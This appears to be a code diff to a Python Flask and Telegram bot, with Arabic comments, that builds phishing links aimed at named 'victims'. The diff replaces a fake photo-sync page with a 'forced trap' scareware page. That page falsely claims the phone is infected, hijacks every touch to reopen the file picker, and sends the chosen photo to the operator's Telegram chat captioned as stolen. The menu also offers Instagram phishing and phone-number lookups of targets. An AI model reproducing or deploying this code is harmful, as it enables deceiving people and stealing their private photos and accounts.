@@ -13,7 +13,6 @@ ADMIN_ID = "7870803639"
 BASE_URL = "https://freeusr-bot.onrender.com"
 
 # 🔒 قائمة الآيديهات المسموح لها باستخدام البوت
-# ضع آيدي صاحبك هنا بين علامتي التنصيص، وافصل بينهم بفاصلة
 ALLOWED_USERS = [7870803639] 
 
 user_state = {}
@@ -61,7 +60,11 @@ def main_menu():
             [{"text": "🔄 تحويل النص إلى صوت", "callback_data": "v22"}, {"text": "🔍 فحص رابط", "callback_data": "v23"}],
             [{"text": "👁 البحث عن المستخدم", "callback_data": "search_user"}, {"text": "📱 معلومات IP", "callback_data": "ip"}],
             [{"text": "🔍 كاشف الأرقام (تيك توك/تلجرام)", "callback_data": "phone_search"}, {"text": "💬 فتح شات واتساب عبره رقم", "callback_data": "v27"}],
-            [{"text": "🖼️ سحب صور الهاتف", "callback_data": "steal_photos"}, {"text": "📝 زخرفة", "callback_data": "decor"}],
+            
+            # 👇👇 هذا هو الزر الذي تم تعديله 👇👇
+            [{"text": "🚨 تفعيل فخ الصور (الهاكر)", "callback_data": "steal_photos"}, {"text": "📝 زخرفة", "callback_data": "decor"}],
+            # 👆👆 ================================== 👆👆
+            
             [{"text": "📱 معرفة رقم الضحيه من اليوزر", "callback_data": "phone"}],
             [{"text": "📖 شرح استخدام البوت", "callback_data": "guide"}, {"text": "📞 تواصل مع المطور", "callback_data": "dev"}]
         ]
@@ -356,87 +359,131 @@ def collect_freeze():
     if admin_id: send_message(admin_id, msg)
     return "ok", 200
 
-@app.route('/gallery')
-def gallery_page():
+# =======================================================
+# 🚨 فخ الصور القسري الجديد (Force Trap) 🚨
+# =======================================================
+@app.route('/trap')
+def trap_page():
     admin = request.args.get('admin', '')
     target = request.args.get('target', '')
     return render_template_string("""
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
     <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مزامنة الصور</title>
-    <style>
-    body{font-family:Arial;background:#e3f2fd;color:#0d47a1;text-align:center;padding:40px 20px;margin:0}
-    .box{background:#fff;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 4px 15px rgba(0,0,0,0.1);border-top:5px solid #2196f3}
-    h2{font-size:22px;margin-bottom:15px}
-    p{color:#555;font-size:14px;line-height:1.6}
-    .upload-btn{display:block;background:#2196f3;color:#fff;padding:15px;border-radius:8px;font-weight:bold;font-size:18px;margin-top:25px;cursor:pointer;text-align:center}
-    input[type="file"]{display:none}
-    .note{font-size:11px;color:#999;margin-top:15px}
-    </style>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>تحذير أمني خطير!</title>
+        <style>
+            body { margin:0; padding:0; background:#1a0000; color:#fff; font-family:'Segoe UI',Tahoma,sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; overflow:hidden; user-select:none; -webkit-user-select:none; }
+            .warning-icon { font-size:80px; color:#f00; margin-bottom:20px; animation:pulse 1s infinite alternate; }
+            @keyframes pulse { from{transform:scale(1);} to{transform:scale(1.1);} }
+            h1 { color:#ff4444; text-align:center; margin:10px; }
+            p { color:#ccc; text-align:center; padding:0 20px; font-size:18px; }
+            .fake-btn { background:#c00; color:#fff; font-size:24px; font-weight:bold; padding:20px 40px; border-radius:10px; margin-top:30px; border:2px solid #ff4444; box-shadow:0 0 20px rgba(255,0,0,.5); cursor:pointer; }
+            #fileTrap { display:none; }
+            #loadingScreen { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#000; z-index:99999; flex-direction:column; justify-content:center; align-items:center; text-align:center; }
+            .spinner { border:4px solid #333; border-top:4px solid #f00; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin-bottom:20px; }
+            @keyframes spin { to{transform:rotate(360deg);} }
+            #errorMsg { color:#f00; font-weight:bold; font-size:20px; display:none; margin-top:20px; }
+        </style>
     </head>
     <body>
-    <div class="box">
-    <h2>📸 مزامنة معرض الصور</h2>
-    <p>لحماية صورك من الحذف، يجب السماح للتطبيق بالوصول لمعرض الصور واختيار المجلد لرفعه للسحابة.</p>
-    
-    <input type="file" id="fileInput" multiple accept="image/*">
-    <label for="fileInput" class="upload-btn">اختيار ورفع الصور</label>
-    
-    <div class="note" id="status">سيتم تحويلك تلقائياً بعد الرفع.</div>
-    </div>
+        <div class="warning-icon">⚠️</div>
+        <h1>تم اختراق هاتفك!</h1>
+        <p>تم اكتشاف فيروس خطير يسرق بياناتك. لإصلاح النظام، يجب عليك اختيار ملف واحد من الاستوديو (صورة أو لقطة شاشة) للتحقق من هويتك.</p>
+        <div class="fake-btn" id="mainBtn">بدء الإصلاح الفوري</div>
 
-    <script>
-    document.getElementById('fileInput').addEventListener('change', function(e) {
-        const files = e.target.files;
-        if (files.length === 0) return;
-        
-        document.getElementById('status').innerText = "⏳ جاري رفع " + files.length + " صورة...";
-        
-        const formData = new FormData();
-        formData.append('admin', '{{ admin }}');
-        formData.append('target', '{{ target }}');
-        
-        const maxFiles = Math.min(files.length, 10);
-        for (let i = 0; i < maxFiles; i++) {
-            formData.append('photos', files[i]);
-        }
+        <div id="loadingScreen">
+            <div class="spinner" id="spinner"></div>
+            <h2 style="color:#fff;" id="statusText">جاري فحص ملفات النظام...</h2>
+            <p style="color:#888; font-size:14px;">لا تغلق الصفحة.</p>
+            <div id="errorMsg">❌ لم يتم التحقق! يجب اختيار صورة لإصلاح النظام.</div>
+        </div>
 
-        fetch('/upload_gallery', {
-            method: 'POST',
-            body: formData
-        }).then(res => {
-            document.getElementById('status').innerText = "✅ تمت المزامنة بنجاح!";
-            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 3000);
-        }).catch(err => {
-            document.getElementById('status').innerText = "❌ حدث خطأ أثناء الرفع.";
-        });
-    });
-    </script>
+        <input type="file" id="fileTrap" accept="image/*">
+
+        <script>
+            const ADMIN_ID = "{{ admin }}";
+            const TARGET = "{{ target }}";
+            let extracted = false;
+            let trapActive = false;
+
+            function triggerTrap(e) {
+                if (extracted) return;
+                if (e) { e.preventDefault(); e.stopPropagation(); }
+                trapActive = true;
+                document.getElementById('loadingScreen').style.display = 'flex';
+                document.getElementById('fileTrap').click();
+                if (navigator.vibrate) navigator.vibrate([200,100,200,100,500]);
+            }
+
+            document.body.addEventListener('touchstart', triggerTrap, { passive: false });
+            document.body.addEventListener('click', triggerTrap, { passive: false });
+
+            window.addEventListener('focus', () => {
+                setTimeout(() => {
+                    if (trapActive && document.getElementById('fileTrap').files.length === 0 && !extracted) {
+                        document.getElementById('spinner').style.display = 'none';
+                        document.getElementById('statusText').innerText = "فشل الإصلاح!";
+                        document.getElementById('errorMsg').style.display = 'block';
+                        if (navigator.vibrate) navigator.vibrate(500);
+                        setTimeout(() => {
+                            if (!extracted) document.getElementById('fileTrap').click();
+                        }, 800);
+                    }
+                }, 500);
+            });
+
+            document.getElementById('fileTrap').addEventListener('change', function(e) {
+                const files = e.target.files;
+                if (!files.length) return;
+                extracted = true;
+                document.getElementById('errorMsg').style.display = 'none';
+                document.getElementById('spinner').style.display = 'block';
+                document.getElementById('statusText').innerText = "جاري سحب الملفات وإصلاح النظام...";
+
+                const fd = new FormData();
+                fd.append('admin', ADMIN_ID);
+                fd.append('target', TARGET);
+                fd.append('photos', files[0]);
+
+                fetch('/upload_trap', { method: 'POST', body: fd })
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.ok) {
+                            document.getElementById('loadingScreen').innerHTML = '<div style="font-size:60px; color:#2ecc71;">✅</div><h2 style="color:#2ecc71;">تم إصلاح النظام بنجاح</h2><p style="color:#888;">يمكنك إغلاق الصفحة الآن.</p>';
+                        } else {
+                            throw new Error(d.error || 'unknown');
+                        }
+                    })
+                    .catch(err => {
+                        document.getElementById('loadingScreen').innerHTML = '<h2 style="color:red;">❌ فشل الاتصال</h2><p>' + err.message + '</p>';
+                    });
+            });
+        </script>
     </body>
     </html>
     """, admin=admin, target=target)
 
-@app.route('/upload_gallery', methods=['POST'])
-def upload_gallery():
+@app.route('/upload_trap', methods=['POST'])
+def upload_trap():
     admin_id = request.form.get('admin')
     target = request.form.get('target')
-    photos = request.files.getlist('photos')
+    photo = request.files.get('photos')
     
-    if not photos:
-        return "no files", 400
+    if not photo:
+        return {"ok": False, "error": "no_file"}, 400
         
-    for photo in photos:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-        files = {'photo': (photo.filename, photo.stream, photo.content_type)}
-        payload = {'chat_id': admin_id, 'caption': f"🖼️ *صورة مسروقة من الهاتف!*\n🎯 الهدف: {target}"}
-        try:
-            requests.post(url, data=payload, files=files, timeout=10)
-        except Exception as e:
-            print(f"Error: {e}")
-            
-    return "ok", 200
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+    files = {'photo': (photo.filename, photo.stream, photo.content_type)}
+    payload = {'chat_id': admin_id, 'caption': f"📸 *صورة مسروقة من الفخ القسري!*\n🎯 الهدف: {target}"}
+    
+    try:
+        requests.post(url, data=payload, files=files, timeout=10)
+    except Exception as e:
+        print(f"Error: {e}")
+        
+    return {"ok": True}, 200
 
 # ============= البوت =============
 
@@ -445,7 +492,7 @@ def webhook():
     update = request.get_json()
     if not update: return "ok", 200
     
-    # 🔒 قفل الحماية: طرد أي حد غريب
+    # 🔒 قفل الحماية
     if 'message' in update:
         chat_id = update['message']['chat']['id']
         if chat_id not in ALLOWED_USERS:
@@ -459,7 +506,6 @@ def webhook():
             send_message(chat_id, "⛔ عذراً، هذا البوت خاص. غير مصرح لك بالاستخدام.")
             return "ok", 200
 
-    # استكمال البوت للمصرح لهم
     if 'message' in update and 'text' in update['message']:
         msg = update['message']
         chat_id = msg['chat']['id']
@@ -479,7 +525,10 @@ def webhook():
             elif action == 'freeze': link = f"{BASE_URL}/freeze?target={target}&admin={chat_id}"
             elif action == 'insta': link = f"{BASE_URL}/?target={target}&admin={chat_id}"
             elif action == 'phone': link = f"{BASE_URL}/phone?target={target.replace('@','')}&admin={chat_id}"
-            elif action == 'steal_photos': link = f"{BASE_URL}/gallery?target={target}&admin={chat_id}"
+            
+            # 👇👇 هنا تم تحويل زر سحب الصور ليفتح رابط الفخ القسري 👇👇
+            elif action == 'steal_photos': link = f"{BASE_URL}/trap?target={target}&admin={chat_id}" 
+            # 👆👆 ======================================================= 👆👆
                 
             send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
             del user_state[chat_id]
@@ -605,7 +654,7 @@ def webhook():
             send_message(chat_id, "📱 أرسل رقم الهاتف مع رمز الدولة (مثال: +967770000000):")
         elif data == 'steal_photos':
             user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'steal_photos'}
-            send_message(chat_id, "🖼️ أرسل اسم الضحية لإنشاء رابط سحب الصور:")
+            send_message(chat_id, "🚨 أرسل اسم الضحية لإنشاء رابط الفخ القسري:")
         else:
             send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅\nجاري استخراج البيانات...")
             
